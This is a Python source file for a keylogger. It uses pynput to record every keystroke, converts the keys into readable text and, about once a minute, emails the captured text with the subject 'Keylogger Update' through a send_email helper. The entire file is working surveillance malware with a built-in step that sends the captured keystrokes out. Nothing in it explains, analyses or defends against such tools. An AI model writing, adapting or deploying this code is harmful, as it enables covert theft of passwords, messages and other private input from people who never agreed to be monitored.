import time
import subprocess
import sys
import os
from pynput.keyboard import Key, Listener
import send_email

if __name__ == "__main__":


    try:
        count = 0
        keys = []
        last_email_time = time.time()

        def on_press(key):
            global keys, count, last_email_time
            keys.append(key)
            count += 1

            if time.time() - last_email_time >= 60:  # 1 minutos em segundos
                last_email_time = time.time()
                email(keys)
                keys.clear()

        def email(keys):
            message = ""
            for key in keys:
                k = str(key).replace("'", "")
                if key == Key.space:
                    k = " "
                elif key == Key.enter:
                    k = "\n"
                elif key == Key.tab:
                    k = "\t"
                elif key == Key.backspace:
                    k = "[BACKSPACE]"
                elif key == Key.delete:
                    k = "[DELETE]"
                elif key == Key.shift:
                    k = "[SHIFT]"
                elif key == Key.ctrl:
                    k = "[CTRL]"
                elif key == Key.alt:
                    k = "[ALT]"
                elif key == Key.esc:
                    k = "[ESC]"
                else:
                    k = k if "Key" not in str(key) else ""
                message += k

            send_email.sendEmail("Keylogger Update", message)

        def on_release(key):
            if key == Key.esc:
                return False

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    except Exception as e:
        print(f"Erro ao iniciar o keylogger: {e}")
        if os.path.exists("keylogger.pid"):
            os.remove("keylogger.pid")
